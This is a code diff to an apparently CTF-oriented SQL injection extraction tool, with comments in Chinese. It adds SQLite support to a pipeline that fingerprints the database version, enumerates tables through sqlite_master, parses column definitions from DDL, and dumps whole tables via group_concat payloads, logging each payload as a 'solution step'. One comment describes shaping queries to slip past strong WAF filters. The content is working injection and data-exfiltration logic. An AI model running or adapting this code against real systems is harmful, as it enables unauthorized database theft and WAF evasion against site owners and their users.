@@ -10,6 +10,7 @@ import re
 from dataclasses import dataclass, field
 
 from .builder import PayloadBuilder
+from .dbms import Dialect, MYSQL, SQLITE, get_dialect, parse_create_table_columns
 from .models import WafReport
 from .oracles import BaseOracle, OracleError
 from .session import HttpSession
@@ -42,22 +43,37 @@ class DumpResult:
 
 class ExtractionPipeline:
     def __init__(self, oracle: BaseOracle, builder: PayloadBuilder,
-                 session: HttpSession, waf: WafReport):
+                 session: HttpSession, waf: WafReport, dialect: Dialect = None):
         self.o = oracle
         self.b = builder
         self.s = session
         self.waf = waf
+        self.dialect = dialect or MYSQL
         self.log = session.log
+
+
+    def _note(self, title: str, note: str = ""):
+        """把当前通道最近一条真实 payload 登记为解题步骤。"""
+        if getattr(self.o, "last_payload", ""):
+            self.s.record_step(title, self.o.last_payload, note)
 
     # ------------------------------------------------------------------ basic
     def version(self) -> str:
-        return self.o.scalar("version()")
+        v = self.o.scalar(self.dialect.version_fn)
+        self._note("获取数据库版本", f"版本 = {v}")
+        return v
 
     def current_db(self) -> str:
-        return self.o.scalar("database()")
+        if self.dialect.current_db_fn is None:
+            return "main"          # SQLite 单库
+        d = self.o.scalar(self.dialect.current_db_fn)
+        self._note("获取当前数据库名", f"当前库 = {d}")
+        return d
 
     def current_user(self) -> str:
-        return self.o.scalar("user()")
+        if self.dialect.user_fn is None:
+            return ""
+        return self.o.scalar(self.dialect.user_fn)
 
     # ------------------------------------------------------------------ meta
     def _can_group_concat(self) -> bool:
@@ -85,6 +101,8 @@ class ExtractionPipeline:
         return items
 
     def list_databases(self) -> list:
+        if self.dialect.name == "sqlite":
+            return ["main"]
         where = "information_schema.schemata"
         if self._can_group_concat():
             dbs = self._fast_list("schema_name", where)
@@ -93,13 +111,33 @@ class ExtractionPipeline:
         return dbs or []
 
     def list_tables(self, db: str) -> list:
+        if self.dialect.name == "sqlite":
+            where = "sqlite_master where(type='table')"
+            if self._can_group_concat():
+                raw = self.o.scalar(
+                    f"(select group_concat(name) from {where}"
+                    f" and(name not like 'sqlite_%'))")
+                self._note("获取全部表名（SQLite）",
+                           "SQLite 用 sqlite_master 代替 information_schema")
+                return [x for x in raw.split(",") if x] if raw else []
+            return self._slow_list("name", where)
         lit = self.b.str_lit(db)
         where = f"information_schema.tables where table_schema={lit}"
         if self._can_group_concat():
-            return self._fast_list("table_name", where)
+            tables = self._fast_list("table_name", where)
+            self._note("获取表名清单",
+                       f"{db} 的表: {tables}")
+            return tables
         return self._slow_list("table_name", where)
 
     def list_columns(self, db: str, table: str) -> list:
+        if self.dialect.name == "sqlite":
+            # 建表语句解析（sqlite 无 information_schema）
+            lit = self.b.str_lit(table)
+            ddl = self.o.scalar(self.dialect.get_ddl.format(lit=lit))
+            cols = parse_create_table_columns(ddl) if ddl else []
+            self.log("INFO", f"[脱库] {table} 的列(SQLite DDL 解析): {cols}")
+            return cols
         # 单条件 table_name 最通用：FinalSQL 类强 WAF 拦 and 双条件与 0x hex 字面量
         lit = self.b.str_lit(table)
         where = f"information_schema.columns where table_name={lit}"
@@ -148,6 +186,7 @@ class ExtractionPipeline:
         sep = self.b.str_lit("~")
         cols_expr = "concat_ws(" + sep + "," + ",".join(columns) + ")"
         raw = self.o.scalar(f"(select group_concat({cols_expr}) from {db}.{table})")
+        self._note(f"导出 {db}.{table} 数据", f"group_concat 一次取回全表")
         rows = []
         for chunk in raw.split(",")[:max_rows]:
             parts = chunk.split("~")
@@ -165,6 +204,7 @@ class ExtractionPipeline:
             if self.s.stopped:
                 break
             raw = self.o.scalar(f"(select group_concat({c}) from {db}.{table})")
+            self._note(f"导出 {db}.{table}.{c} 数据", "逐列 group_concat（concat_ws 被滤时降级）")
             col_vals[c] = raw.split(",") if raw else []
         n = min(max((len(v) for v in col_vals.values()), default=0), max_rows)
         rows = []
